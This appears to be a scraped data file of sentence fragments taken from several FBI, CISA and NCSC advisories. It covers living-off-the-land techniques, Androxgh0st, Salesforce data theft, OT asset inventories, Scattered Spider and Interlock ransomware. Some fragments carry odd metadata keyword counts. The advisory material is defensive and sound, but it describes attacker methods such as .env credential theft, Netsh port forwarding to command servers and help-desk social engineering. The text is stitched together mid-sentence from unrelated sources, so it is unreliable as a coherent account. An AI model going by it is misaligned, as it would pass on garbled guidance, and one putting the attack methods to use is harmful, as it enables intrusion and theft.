reuse those credentials to gain access to other hosts and services. Enhance network segmentation and monitoring to limit lateral movement  possibilities for threat actors. Abnormal network behavior may indicate the presence  of a threat actor that evaded host-based detections, possibly via LOTL techniques. When a cyber threat actor compromises legitimate credentials, having  appropriate network segmentation limits the “blast radius” of accessible systems. Snort, Suricata) to  improve LOTL threat detection. Select vendors with secure by design principles in place  to reduce the availability of LOLBins that threat actors can leverage. Network defenders can find host artifacts, unless the threat actor deletes them, without  making configuration changes to the system. Such obfuscation methods are often used by  cyber threat actors to bypass security monitoring tools and execute malicious  payloads without detection. o Cyber threat actors can bypass standard event logs for registering services and  scheduled tasks purely by writing to the registry since this does not create  standard system events. Tailored Detection Examples  Understanding the context of LOTL activities is crucial for accurate detection and response,  so this section includes tailored detection guidance from real-word examples—specifically  ntdsutil.exe and psexec.exe, which are frequently used by state-sponsored advanced  persistent threat (APT) actors in compromised environments. Through strict network segmentation and the enforcement of principles of least privilege, an  organization could restrict the threat actor’s ability to move laterally across the network. Additionally, robust privileged access management would  ensure that elevated access is granted sparingly and monitored closely, making it  challenging for a cyber threat actor to misuse stolen credentials. Investigate to determine the highest privilege level account that the threat actor had  or has access to. If the threat actor has control of an administrative account, such as Windows  Active Directory Domain Admin, reset credentials of privileged and non-privileged  accounts within the trust boundary of each compromised account. If alerting the cyber threat actor needs to be avoided   TLP:CLEAR        27 TLP:CLEAR  (e.g., for intelligence purposes), then privileges can be reduced for affected  accounts/devices to “contain” them. Reset the relevant account credentials or access keys if the investigation finds  the threat actor’s access is limited to non-elevated permissions. Insecure  software allows threat actors to leverage flaws to enable LOTL techniques and the  responsibility should not solely be on the end user. • Minimize attack surfaces that can be leveraged by cyber threat actors using LOTL techniques. Disable unnecessary protocols by default, limit the number of processes and programs running with escalated privileges, and take other steps to limit the ability for cyber threat actors to leverage native functionality to conduct intrusions. When  configuration is necessary, the default option should be broadly secure against  common threats. TLP:CLEAR  32 TLP:CLEAR  Acknowledgements  The following organizations contributed to this guide:  • Amazon Web Services (AWS) • Energy industry representatives, through the DOE CESER Energy Threat Analysis  Center (ETAC) pilot. TLP:CLEAR  33 TLP:CLEAR  Appendix A: LOTL in WIndows, Linux, MacOS, and Hybrid  Environments  Windows  Some common LOLBins cyber threat actors use in Windows (on-premises and hybrid)  environments are wmic.exe, ntdsutil.exe, Netsh, cmd.exe, PowerShell for execution. Modifications were made to the MountPoints2\CPC registry keys for three user accounts, suggesting cyber threat actors attempted to hide indications of data exfiltration. • CISA observed the threat actors use the Netsh command to create a portProxy registry modification on compromised devices. This registry setting caused inbound traffic on port 49275 to be forwarded to a suspected threat actor command and control server on port 8443. Linux  Some common LOLBins cyber threat actors use in Linux environments are curl,  systemctl, systemd, and python. For example, cyber threat actors:  • Use scripting environments like Python to gain interactive shell access, generate a reverse shell, transfer files, or to run custom scripts on compromised devices. TLP:CLEAR  34 TLP:CLEAR  • Scripting Environment and Tool Exploitation in macOS: Cyber threat actors exploit macOS's native scripting languages and built-in tools for malicious purposes. • Manipulating Property List (PLIST) files for persistence: Cyber threat actors may modify PLIST files to automatically execute malicious payloads during system startup or user login. • Escalating privileges via misconfigured sudoers: Cyber threat actors may exploit sudoers misconfigurations that allow executing commands as a superuser without a password, enabling them to gain elevated access. • Bypassing Gatekeeper for malware execution: Cyber threat actors may bypass Gatekeeper by leveraging trusted developer certificates or modifying system settings to allow execution from unidentified developers. Cyber threat actors who gain access to virtual instances may attempt to query the IMDS API to obtain credentials and gain further access to cloud resources [4]. • Achieve persistence through scheduled tasks: Cloud automation services can be used by cyber threat actors to achieve persistence in the environment by creating or modifying an event trigger to run malicious scripts whenever the event occurs. Cyber threat actors may also use this technique to escalate privileges by taking advantage of the fact that these automated actions can be configured to run under a different account than the user (such as a service account, which may have more privileges than the cyber threat actor) [5]. Threat actors can target these accounts to achieve persistent access to the cloud tenant rather than having to continually bypass MFA protections on user accounts even with compromised credentials. Cyber threat actors can leverage these services to exfiltrate traffic [6]. CLI tools can be  misused for unauthorized activities on cloud resources, including data exfiltration  and establishing persistent threats. Threat actors target ADFS to compromise and  manipulate federation tokens and impersonate legitimate users or entities. This  allows threat actors to gain unauthorized access to a multitude of resources. • Token manipulation and replay attacks: In hybrid environments, threat actors exploit  the inherent trust between on-premises identity providers and cloud services. CLI tools can  be misused for unauthorized activities on cloud resources, including data exfiltration  and establishing persistent threats. Threat actors can  exploit these platforms to gain comprehensive insights into the hybrid infrastructure,  modify configurations, or deploy malicious elements. TLP:CLEAR        36 TLP:CLEAR  Appendix B: Third-Party Tools for LOTL  Cyber threat actors use deployed software/remote access software, including the following,  for LOTL:  • Mobile device management systems. Mobile device management (MDM) systems  are attractive targets for threat actors because they provide elevated access to  thousands of mobile devices. RMM software has significant capabilities to monitor or operate devices and  systems as well as attain heightened permissions, making it an attractive tool for  cyber threat actors to maintain persistence and move laterally on compromised  networks. • EDR: Cyber threat actors leverage common EDR tools installed on the victim  networks to take advantage of the tools’ remote-shell capabilities.[7]  • VM management tools: Cyber threat actors target vital virtualization management  tools to exploit VM infrastructures. • Database management tools: Cyber threat actors can target database management  tools to execute SQL commands, extract sensitive data, or manipulate database  entries. The compromise of these  systems can lead to a cyber threat actor’s ability to monitor network traffic, alter  configurations, and potentially disrupt network operations, exploiting the very tools  used to ensure network stability and security. IAM systems, which are central to  managing network user identities and access, are frequently targeted by cyber threat  actors for their critical role in network access control. Cyber threat actors can manipulate IT service  management (ITSM) platforms, exploiting these systems to alter tickets, workflows,  and trigger automated actions for malicious purposes.

CISA and the Federal  Bureau of Investigation (FBI) are releasing this Alert based upon recent and  ongoing threat activity to urge SOHO router manufacturers to build security into  technology products from the beginning and encourage all customers of SOHO  routers to demand better security by design. However, due to widespread sale, and subsequent use, of insecure SOHO routers that lack basic security  features, threat actors, including the PRC-sponsored Volt Typhoon group, are exploiting these devices at scale. The creation of products that lack appropriate security controls is unacceptable given the current  threat environment. Manufacturers should design, develop, and deliver SOHO routers with security and safety in mind to create product  resiliency against foreseeable threats.

Known Indicators of Compromise Associated with Androxgh0st Malware,2024-01-16,1,"{'threats_of_violence': 39, 'botnet': 4, 'malware': 12}","To request incident response resources or technical assistance related to these  threats, contact CISA at report@cisa.dhs.gov. Product ID: AA24-016A January 16, 2024 Co-Authored by:  TLP:CLEAR TLP:CLEAR Known Indicators of Compromise Associated  with Androxgh0st Malware  SUMMARY  The Federal Bureau of Investigation (FBI) and the  Cybersecurity and Infrastructure Security Agency (CISA)  are releasing this joint Cybersecurity Advisory (CSA) to  disseminate known indicators of compromise (IOCs) and  tactics, techniques, and procedures (TTPs) associated  with threat actors deploying Androxgh0st malware. See the MITRE  ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE  ATT&CK tactics and techniques with corresponding mitigation and/or detection recommendations. In particular, threat actors deploying Androxgh0st  have been observed exploiting CVE-2017-9841 to remotely run hypertext preprocessor (PHP) code  on fallible websites via PHPUnit [T1190]. This  PHP page runs PHP code submitted through a POST request, which allows the threat actors to  remotely execute code. Threat actors are further able to set up a fake (illegitimate) page accessible via the URI to  provide backdoor access to the website. This allows threat actors to download additional malicious  files for their operations and access databases. After identifying websites using the Laravel web application, threat actors attempt to  determine if the domain’s root-level .env file is exposed and contains credentials for accessing  additional services. Threat actors often  target .env files to steal these credentials within the environment variables. If the .env file is exposed, threat actors will issue a GET request to the /.env URI to attempt to  access the data on the page. This data is  frequently used as an identifier for the threat actor. A successful response  from either of these methods allows the threat actors to look for usernames, passwords, and/or other  credentials pertaining to services such as email (via SMTP) and AWS accounts. If the threat actors successfully identify the Laravel application key, they will attempt  exploitation by using the key to encrypt PHP code [T1027.010]. In doing so, the threat actors can upload files to the website via  remote access. Threat actors can  identify uniform resource locators (URLs) for files outside root directory through a path traversal  attack [T1083]. If threat actors obtain credentials for any services using the above methods, they may use these  credentials to access sensitive data or use these services to conduct additional malicious operations. For example, when threat actors successfully identify and compromise AWS credentials from a  vulnerable website, they have been observed attempting to create new users and user policies  [T1136]. Additional URIs observed by the FBI and a trusted third party used by these threat actors for  credential exfiltration include:  •  /info  •  /phpinfo  •  /phpinfo.php  •  /?phpinfo=1  •

Multiple, ongoing investigations and trusted third party  reporting yielded the IOCs and TTPs, and provided  information on Androxgh0st malware’s ability to  establish a botnet that can further identify and  compromise vulnerable networks. Overview  Androxgh0st malware has been observed establishing a botnet [T1583.005] for victim identification  and exploitation in target networks. Laravel Framework Targeting  Androxgh0st malware establishes a botnet to scan for websites using the Laravel web application  framework. According to open source reporting[1], Androxgh0st is a Python- scripted malware [T1059.006] primarily used to target .env files that contain confidential information,  such as credentials [T1552.001] for various high profile applications (i.e., Amazon Web Services  [AWS], Microsoft Office 365, SendGrid, and Twilio from the Laravel web application framework). Androxgh0st malware also supports numerous functions capable of abusing the Simple Mail Transfer  Protocol (SMTP), such as scanning [T1046] and exploiting exposed credentials [T1078] and  application programming interfaces (APIs) [T1114], and web shell deployment [T1505.003]. Targeting the PHPUnit  Androxgh0st malware TTPs commonly involves the use of scripts, conducting scanning [T1595] and  searching for websites with specific vulnerabilities. FBI | CISA  Page 3 of 13  |  Product ID: AA24-016A  TLP:CLEAR  TLP:CLEAR Androxgh0st malware can also access the application key [TA0006] for the Laravel application on the  website. The FBI and CISA recommend network defenders apply the following mitigations to limit potential  adversarial use of common system and network discovery techniques and to reduce the risk of  compromise by actors using Androxgh0st malware."
Creating and maintaining a definitive view of your Operational Technology (OT) Architecture,2025-09-29,3,"{'ransomware': 1, 'threats_of_violence': 24, 'malware': 1}","It is critical that backups are implemented to be  ransomware resistant to protect their availability. As the number and capability of threat actor targeting OT increases, so too does the  need for robust cyber security controls. Skilled threat actors will seek to gain insight into a target system to support their capability  development and attack planning. To achieve these aims, threat actors require information on how your system  is architected, secured and operates. There are three primary ways that threat actors can use OT information to finesse their cyber  attacks:  Inform  Data can help a threat actor understand the broader context of their target system. Threat actors may seek information on dependent systems that rely on, or  contribute to, the correct operation of the target system. 13  Maintaining a definitive view of your Operational Technology (OT) Architecture  A good approach is to consider the information an attacker would require within your threat  modelling. After identifying the relevant information for each threat scenario, you can then  analyse how an attacker might exploit that information and assess how critical its compromise is  to their overall success. A data aggregation risk arises when threat actors have access to a collection of information that,  when combined, can lead to development of capabilities that would not be possible using the  individual pieces alone (this is described as latent intelligence). You should understand how  information could be combined by a threat actor to chain together attack paths. Summary:  You will be able to identify the OT information that supports different threat  scenarios, understand the ways threat actors seek to exploit this information and recognise  how aggregating OT information increases this risk. 17  Maintaining a definitive view of your Operational Technology (OT) Architecture  Exposure  Exposure refers to the discoverability and accessibility of networked devices within an  organisation, which could make them vulnerable to potential threats. While this is useful, it is less critical  to day-to-day operations; however, it also more exposed to potential threats. When looking at updating in this scenario, you might choose to prioritise updates or  maintenance of the firewall due to its exposure to threats, despite the fact it is less critical to  the OT system. Your organisation should use a comprehensive risk management framework to inform these  decisions, such as the NCSC's risk management framework (which aligns with international  standards such as ISO 27001 and includes vital techniques such as threat modelling and attack  trees ). For instance, the use of wireless communication technologies can elevate risks, as  threat actors may not need to be physically present to exploit the system. 21  Maintaining a definitive view of your Operational Technology (OT) Architecture  •  a reference to the how the record is maintained in line with existing change management  policies  •  a process for periodic reviews to confirm the necessity of each connection against  associated risks to the OT network and evolving threats  Additional risk assessments should be performed for external connections to assess if connectivity  is required, as well as the security controls implemented. This is especially critical for systems connected to external networks,  where exposure to threats is higher. 23  Maintaining a definitive view of your Operational Technology (OT) Architecture  •  the use of compensating controls on communications, including how these are managed  and maintained  •  legacy protocol use, including reasons why they cannot be migrated to more modern  protocols (and any plans to upgrade the asset out of service)  •  how segmentation, additional monitoring or other complementing controls can manage  this risk when protocol-layer security may not be feasible (such as in low-latency safety  systems)   •  the logging and monitoring of OT protocols within the system, including the protocols  communications structure and flows   •  normal traffic patterns (such as consistent packet sizes or used commands) as this  understanding aids in identifying potential malicious activity on the network; variations in  expected traffic could indicate issues or threats    Summary: For each asset you should have documented in use protocols, along with their  corresponding TCP/UDP ports. 24  Maintaining a definitive view of your Operational Technology (OT) Architecture  Continuous network monitoring and alerting  Maintaining persistent visibility enables you to detect anomalies, identify potential threats, and  respond to incidents before they escalate. This includes using multi- factor authentication, role-based access control (RBAC), and regular access reviews to reduce the  risk of unauthorised access or insider threats. If security compromises have been necessary in the external connectivity, you should have  mitigating controls in place to limit the potential impact of a threat actor if a compromise occurs. These are likely to fall into 3 trust levels:  Equal trust   Information sharing routes with other critical national infrastructure (CNI) organisations that  operate within the same threat model, and where you have assurance over the technical controls  they have implemented. Note: The use of removable media should be restricted to approved items, as removable media  introduces an additional attack vector through which a threat actor can enter the environment. For example, a threat actor could use malicious USB device to emulates a trusted Human  Interface Device (HID), such as a keyboard, to perform keystroke injection attacks. Once  connected, the device can rapidly deliver pre-programmed keystrokes to execute commands,  install malware, or alter system configurations."

TLP:CLEAR  TLP:CLEAR  12 September 2025  FLASH-20250912-001  Cyber Criminal Groups UNC6040 and UNC6395  Compromising Salesforce Instances for Data Theft and  Extortion      Summary  The Federal Bureau of Investigation (FBI) is releasing this FLASH to disseminate Indicators of  Compromise (IOCs) associated with recent malicious cyber activities by cyber criminal groups  UNC6040 and UNC6395, responsible for a rising number of data theft and extortion intrusions. Some UNC6040 victims have subsequently received extortion emails allegedly from the  ShinyHunters group, demanding payment in cryptocurrency to avoid publication of exfiltrated  data. These extortion demands have varied in time following UNC6040 threat actors’ access  and data exfiltration, ranging from a period of days to months. FLASH Number  The following information is being provided by the FBI, with no guarantees or warranties, for potential  use at the sole discretion of recipients to protect against cyber threats. To do so, UNC6040 threat actors commonly call victims’ call centers posing  as IT support employees addressing enterprise-wide connectivity issues. After obtaining access, UNC6040  threat actors have then used API queries to exfiltrate large volumes of data in bulk. UNC6040 threat actors have also directly requested user credentials and multifactor  authentication codes to authenticate and add the Salesforce Data Loader application,  facilitating data exfiltration. UNC6040 threat actors have deceived victims into authorizing  malicious connected apps to their organization's Salesforce portal. This  grants UNC6040 threat actors significant capabilities to access, query, and exfiltrate sensitive  information directly from the compromised Salesforce customer environments. UNC6040 threat actors have created malicious applications within Salesforce trial accounts,  allowing the threat actors the ability to register the connected apps without using a legitimate  corporate account, making detection difficult. In August of 2025, UNC6395 threat actors exploited compromised OAuth tokens for  the Salesloft Drift application, an AI chatbot that can be integrated with Salesforce. Using the       TLP:CLEAR  TLP:CLEAR  compromised OAuth tokens and third-party app integration, UNC6395 threat actors were able  to compromise victims’ Salesforce instances and exfiltrate data. On August 20, 2025, Salesloft, in collaboration with Salesforce, revoked all active access and  refresh tokens with the Drift application, terminating any threat actor access to victims’  Salesforce platforms from the previously connected Salesloft app."

While not all encompassing, the following are the most notable  threat group names related to this activity and commonly used within the cybersecurity  community:    Salt Typhoon,     OPERATOR PANDA,    RedMike,    UNC5807, and    GhostEmperor. The TTP descriptions can also be useful  to network defenders for retroactive threat hunting. This alteration allows  the actors to bypass security policies and maintain ongoing access by explicitly  permitting traffic from a threat actor-controlled IP address [T1562.004].

Foundations for OT Cybersecurity: Asset Inventory Guidance for Owners and Operators,2025-08-13,3,"{'extortion': 1, 'threats_of_violence': 9}","OT is vital to critical infrastructure services like energy production and distribution, as well as water and  wastewater treatment, making it a prime target for malicious cyber actors seeking to disrupt or destroy  systems and services or perform other nefarious activities, such as extortion. Creating an asset inventory is necessary for building a modern defensible architecture and one of CISA’s  Cybersecurity Performance Goals (CPGs).P0F1 P A modern defensible architecture mitigates risk through a  thoughtful system design and implementation that enables OT cyber defenders to identify, prevent, and  respond to cyber threats while ensuring reliability, operational continuity, safety, and compliance with  regulatory requirements.P1F2 P An 61TOT asset inventory61T—an organized, regularly updated list of an organization’s  OT systems, hardware, and software—is foundational to designing a modern defensible architecture  because without an inventory, organizations do not know what they have and what should be secured and  protected.

Update End  Reconnaissance, Resource Development, and Initial Access  Scattered Spider intrusions historically began with broad phishing [T1566] and smishing [T1660] attempts  against a target using organization-specific crafted domains, such as the domains listed in Table 3  [T1583.001]. Page 6 of 17 | Product ID: AA23-320A  TLP:CLEAR  TLP:CLEAR  FBI | CISA | RCMP | ASD’s ACSC  AFP | CCCS | NCSC-UK  While Scattered Spider initially began their activity relying upon broad phishing campaigns, the threat  actors are now employing more targeted and multilayered spearphishing and vishing operations.

Update July 29, 2025:  Per trusted third parties, Scattered Spider threat actors typically engage in data theft for extortion and also  use several ransomware variants, most recently deploying DragonForce ransomware alongside their usual  TTPs. Overview  Scattered Spider (also known as, UNC3944, Scatter Swine, Oktapus, Octo Tempest, Storm-0875, and  Muddled Libra) engages in data extortion and several other criminal activities.1 Scattered Spider threat  actors use multiple social engineering techniques—including push bombing—and subscriber identity  module (SIM) swap attacks, to obtain credentials, install remote access tools, and/or bypass multi-factor  authentication (MFA). ▪  Monetized access to targeted organization’s networks in numerous ways including extortion  enabled by ransomware and data theft [T1657]. TLP:CLEAR  FBI | CISA | RCMP | ASD’s ACSC  AFP | CCCS | NCSC-UK  Page 5 of 17 | Product ID: AA23-320A  TLP:CLEAR  Update End  Recent Scattered Spider TTPs  File Encryption  Update July 29, 2025:  The FBI has identified that Scattered Spider threat actors may exfiltrate data from targeted organization’s  systems for extortion and then encrypt data on the system for ransom [T1486]. Table 16: Exfiltration  Technique Title  ID  Use  Exfiltration  TA0010  Scattered Spider threat actors exfiltrate data from a target network  for data extortion. Financial Theft  T1657  Scattered Spider threat actors monetized access to targeted  organization’s networks in numerous ways including extortion- enabled ransomware and data theft. In addition, the authoring agencies recommend network defenders apply the following mitigations to limit  potential adversarial use of common system and network discovery techniques, and to reduce the impact  and risk of compromise by ransomware or data extortion actors:  ▪  Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data  and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage  device, the cloud). In addition to new TTPs that include more sophisticated  social engineering techniques, the advisory describes additional malware and ransomware variants  used to exfiltrate data and encrypt targeted organizations’ systems. Update July 29, 2025:  RattyRAT  Java-based remote access trojan, used for persistent, stealth access and  internal reconnaissance.4  DragonForce Ransomware  Infiltrates networks, encrypts data, and demands ransom. Scattered Spider threat actors have observably exfiltrated data [TA0010] after gaining access and  threatened to release it without deploying ransomware. According to trusted third parties, where more recent incidents are concerned, Scattered Spider threat  actors may have deployed DragonForce ransomware onto targeted organizations’ networks—thereby  encrypting VMware Elastic Sky X integrated (ESXi) servers [T1486]. ▪  Segment networks to prevent the spread of ransomware. Network segmentation can help prevent  the spread of ransomware by controlling traffic flows between—and access to—various subnetworks  and by restricting adversary lateral movement [CPG 2.F]. ▪  Identify, detect, and investigate abnormal activity and potential traversal of the indicated  ransomware with a networking monitoring tool. To aid in detecting the ransomware, leverage a tool  that logs and reports all network traffic and activity, including lateral movement, on a network. Furthermore, payment may also embolden adversaries to target  additional organizations, encourage other criminal actors to engage in the distribution of ransomware,  and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the  ransom, FBI and CISA urge you to promptly report ransomware incidents to FBI’s Internet Crime Complain  Center (IC3), a local FBI Field Office, or CISA via the agency’s Incident Reporting System or its 24/7  Operations Center at SOC@mail.cisa.dhs.gov or 1-844-Say-CISA (1-844-729-2472). 2 Tim Parisi, “Not a SIMulation: CrowdStrike Investigations Reveal Intrusion Campaign Targeting Telco and  BPO Companies,” Crowdstrike (blog), Crowdstrike, last modified December 1, 2022,  https://www.crowdstrike.com/blog/analysis-of-intrusion-campaign-targeting-telecom-and-bpo-companies/;   Crowdstrike Intelligence Team, SCATTERED SPIDER Exploits Windows Security Deficiencies with Bring-Your- Own-Vulnerable-Driver Tactic in Attempt to Bypass Endpoint Security, Crowdstrike (blog), Crowdstrike, last  modified January 19, 2023, https://www.crowdstrike.com/blog/scattered-spider-attempts-to-avoid- detection-with-bring-your-own-vulnerable-driver-tactic/; and Christopher Boyd, “Ransomware group steps  up, issues statement over MGM Resorts compromise,” ThreatDown Intelligence (blog), Malwarebytes, last  modified September 18, 2023, https://www.malwarebytes.com/blog/personal/2023/09/ransomware- group-steps-up-issues-statement-over-mgm-resorts-compromise. 3 Boyd, “Ransomware group steps up, issues statement over MGM Resorts compromise.”   4 Ayelen Torello, “Emulating the Unyielding Scattered Spider,” AttackIQ (blog), AttackIQ, last modified May  29, 2025, https://www.attackiq.com/2025/05/29/emulating-scattered-spider/. Summary  The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), Royal  Canadian Mounted Police (RCMP), Australian Signals Directorate’s (ASD’s) Australian Cyber Security Centre  (ACSC), Australian Federal Police (AFP), Canadian Centre for Cyber Security (CCCS), and United Kingdom’s  National Cyber Security Centre (NCSC-UK)—hereafter referred to as the authoring organizations—are  releasing this joint Cybersecurity Advisory in response to recent activity by Scattered Spider threat actors  against the commercial facilities sectors, subsectors, and other sectors. While some TTPs remain consistent, Scattered Spider threat actors often change TTPs to remain  undetected. See the MITRE  ATT&CK Tactics and Techniques section of this advisory for tables of the threat actors’ activity mapped to  MITRE ATT&CK tactics and techniques. According to public reporting, Scattered Spider threat actors have:2  ▪  Posed as company IT and/or helpdesk staff using phone calls or SMS messages to obtain  credentials from employees and gain access to the network [T1598] [T1656]. The FBI observed Scattered Spider threat actors, after gaining access to networks, using publicly available,  legitimate remote access tunneling tools. Update End  Scattered Spider threat actors historically evade detection on target networks by using living off the land  (LOTL) techniques and allowlisted applications to navigate a targeted organization’s network, as well as  frequently modifying their TTPs. After exfiltrating and/or  encrypting data, Scattered Spider threat actors communicate with targeted organizations via TOR, Tox,  email, or encrypted applications. Table 3: Domains Used by Scattered Spider Threat Actors  Domains  targetsname-sso[.]com  targetsname-servicedesk[.]com  targetsname-okta[.]com  Update July 29, 2025:   targetsname-cms[.]com  targetsname-helpdesk[.]com  oktalogin-targetcompany[.]com  The targeted organization’s name is often appended with either a -helpdesk or a type of single sign-on  (SSO) solution to add credibility. While Scattered Spider threat actors have not been observed using these  techniques recently, the group continuously evolves its TTPs and these methods could be reused. Scattered Spider threat actors currently use a variety of methods to gain initial access to a targeted  organization’s network. In some instances, the threat actors purchase employee or contractor credentials  on illicit marketplaces such as Russia Market [T1597.002]. In other cases, the threat actors compromise  third party services with access to several potential targeted organization’s networks [T1199]. It is common  for the threat actors to gather the personally identifiable information (PII) of users with elevated access to  their network using online open-source information. After identifying usernames, passwords, PII [T1589], and conducting SIM swaps, the threat actors then use  layered social engineering techniques [T1656] which frequently occur over several calls [T1598.004]. Once that information is identified, the threat actors continue to conduct phone calls to  employees and help desks to gather password reset specific information of a targeted employee. Finally, the threat actors conduct spearphising calls to convince IT help desk personnel to reset passwords  and/or transfer MFA tokens [T1078.002] [T1199] [T1566.004]. At which point, the threat actors perform  account takeovers against the users in SSO environments. Scattered Spider threat actor tactics and techniques  also make it more difficult for network defenders to warn targeted organizations or to use threat hunting  tools to proactively identify intrusions. Update End  Execution, Persistence, and Privilege Escalation  Scattered Spider threat actors then register their own MFA tokens [T1556.006] [T1606] and deploy remote  monitoring and management (RMM) tools [T1219] after compromising a user’s account to establish  persistence [TA0003]. Historically, the threat actors added a federated identity provider to the targeted  organization’s SSO tenant and activated automatic account linking [T1484.002]. While the threat actors  may still be using this tactic, it has not been identified as a current TTP. The threat actors were then able to sign into any account by using a matching SSO account attribute. At  this stage, Scattered Spider threat actors already controlled the identity provider and then could choose an  arbitrary value for this account attribute. This activity allowed the threat actors to perform privilege  escalation [TA0004] and continue logging in even when passwords were changed [T1078]. Threat actors  achieve elevated privileges by leveraging internal communication tools to contact employees and social  engineering. Discovery, Lateral Movement, and Exfiltration  Once persistence is established on a target network, Scattered Spider threat actors often perform  discovery, specifically searching for SharePoint sites [T1213.002], credential storage documentation  [T1552.001], VMware vCenter infrastructure [T1018], backups, and instructions for setting up/logging into  Virtual Private Networks (VPNs) [TA0007]. The threat actors enumerate the targeted organization’s Active  Directory (AD) and then perform discovery and exfiltration of the targeted organization’s code repositories  [T1213.003], code-signing certificates [T1552.004], and source code [T1083] [TA0010]. Threat actors  activate Amazon Web Services (AWS) Systems Manager Inventory [T1538] to discover targets for lateral  movement [TA0007] [TA0008], then move to both preexisting [T1021.007] and actor-created [T1578.002]  Amazon Elastic Compute Cloud (EC2) instances. In instances where the ultimate goal is data exfiltration,   TLP:CLEAR  FBI | CISA | RCMP | ASD’s ACSC  AFP | CCCS | NCSC-UK  Page 7 of 17 | Product ID: AA23-320A  TLP:CLEAR  Scattered Spider threat actors use actor-installed extract, transform, and load (ETL) tools [T1648] to bring  data from multiple data sources into a centralized database [T1074] [T1530]. Update July 29, 2025:  In many instances, Scattered Spider threat actors search for a targeted organization’s Snowflake access to  exfiltrate large volumes of data in a short time, often running thousands of queries immediately [T1567]. Update End  To determine if their activities have been detected and to maintain persistence within the compromised  system, Scattered Spider threat actors often search a targeted organization’s Slack, Microsoft Teams, and  Microsoft Exchange Online for emails [T1114] or conversations regarding the threat actors’ intrusion and  any security response. The threat actors frequently join incident remediation and response calls and  teleconferences, likely to identify how security teams are hunting them and proactively develop new  avenues of intrusion in response to a targeted organizations’ defenses. Scattered Spider threat actors  consistently use proxy networks [T1090] and rotate machine names to further hamper detection and  response.

Interlock actors leverage a double extortion model, in which they both encrypt and exfiltrate victim data. Ransom notes do not include an initial ransom demand or payment instructions; instead, victims are  provided with a unique code and are instructed to contact the ransomware group via a .onion URL  through the Tor browser. Interlock actors use a double- extortion model [T1657], encrypting systems after exfiltrating data. Interlock actors do not leave an initial ransom demand or payment instructions on compromised networks,  and do not relay this information until contacted by the victim. Actors use a double- extortion model, both encrypting victim data and threatening release  of victim data on their Tor network leak site if the ransom is not paid.

Actions for Organizations to Take Today to Mitigate Cyber Threats Related to Interlock  Ransomware Activity  July 22, 2025   TLP:CLEAR  FBI | CISA | HHS | MS-ISAC  Page 2 of 19 | Product ID: AA25-203A  TLP:CLEAR  disseminate known Interlock ransomware IOCs and TTPs identified through FBI investigations (as recently  as June 2025) and trusted third-party reporting. The Interlock ransomware variant was first observed in late September 2024, targeting various business,  critical infrastructure, and other organizations in North America and Europe. FBI is aware of Interlock  ransomware encryptors designed for both Windows and Linux operating systems; these encryptors have  been observed encrypting virtual machines (VMs) across both operating systems. FBI observed actors  obtaining initial access via drive-by download from compromised legitimate websites, which is an  uncommon method among ransomware groups. FBI, CISA, HHS, and MS-ISAC encourage organizations to implement the recommendations in the  Mitigations section of this advisory to reduce the likelihood and impact of Interlock ransomware incidents. Overview  Since September 2024, Interlock ransomware actors have impacted a wide range of businesses and  critical infrastructure sectors in North America and Europe. TLP:CLEAR  FBI | CISA | HHS | MS-ISAC  Page 3 of 19 | Product ID: AA25-203A  TLP:CLEAR  The authoring agencies are aware of emerging open-source reporting detailing similarities between the  Rhysida and Interlock ransomware variants.0F1 For additional information on Rhysida ransomware, see the  joint advisory, #StopRansomware: Rhysida Ransomware. Initial Access  FBI has observed Interlock actors obtaining initial access [TA0001] via drive-by download [T1189] from  compromised legitimate websites, an atypical method for ransomware actors. Interlock ransomware  methods for initial access have previously disguised malicious payloads as fake Google Chrome or  Microsoft Edge browser updates, though a cybersecurity company recently reported a shift to payload  filenames masquerading as updates for common security software (see Table 3 and Table 4 for a list of  filenames).1F2  In some instances, FBI has observed Interlock actors using the ClickFix social engineering technique, in  which unsuspecting users are prompted to execute a malicious payload by clicking a fake Completely  Automated Public Turing test to tell Computers and Humans Apart (CAPTCHA) [T1189]. According to open source reporting, the credential stealer collects login  information and associated URLs for victims’ online accounts [T1555.003], while the keylogger dynamic  link library (DLL) logs users’ keystrokes in a file named conhost.txt [T1036.005].6F7 As of February 2025,  private cybersecurity analysts also observed Interlock ransomware infections executing different versions  of information stealers [TA0006], including Lumma Stealer7F8 and Berserk Stealer, to harvest credentials for  lateral movement and privilege escalation [T1078].8F9  Interlock actors leverage compromised credentials and Remote Desktop Protocol (RDP)9F10 [T1021.001] to  move between systems. FBI has observed Interlock ransomware encryptors for both Windows  and Linux operating systems. In addition, cybersecurity  researchers have identified Interlock ransomware samples using a FreeBSD ELF encryptor [T1486], a  departure from usual Linux encryptors designed for VMware ESXi servers and VMs.13F14   A cybersecurity company identified a DLL binary named tmp41.wasd—executed after encryption using  rundll32.exe [T1218.011]—which uses the remove() function to delete the encryption binary  [T1070.004];14F15 on Linux machines, the encryptor uses a similar technique to execute the removeme  function. The ransom note provides each victim  with a unique code and instructions to contact the ransomware actors via a .onion URL. The actors threaten to  publish the victim’s exfiltrated data to their leak site on the Tor network unless the victim pays the ransom  demand; the actors have previously followed through on this threat.15F16  Leveraged Tools  See Table 2 for publicly available tools and applications used by Interlock ransomware actors.

Mitigations  The authoring agencies recommend organizations implement the mitigations below to improve your  organization’s cybersecurity posture on the basis of the Interlock ransomware actors’ activity. At-risk organizations should implement the following mitigations:    Prevent Interlock ransomware actors from obtaining initial access:  o Implement domain name system (DNS) filtering to block users from accessing malicious sites  and applications.   Segment networks [CPG 2.F] to prevent the spread of ransomware. o Network segmentation can help prevent the spread of ransomware by controlling traffic flows  between—and access to—various subnetworks and by restricting adversary lateral movement.   Identify, detect, and investigate abnormal activity and potential traversal of the indicated  ransomware [CPG 3.A] with a networking monitoring tool [CPG 2.T]. o To aid in detecting ransomware, implement a tool that logs and reports all network traffic,  including lateral movement activity on a network. Resources    Stopransomware.gov: Whole-of-government, central location for ransomware resources and alerts.   #StopRansomware Guide: Resource to mitigate a ransomware attack.   Cyber Hygiene Services, Ransomware Readiness Assessment: CISA’s no-cost cyber hygiene  services.

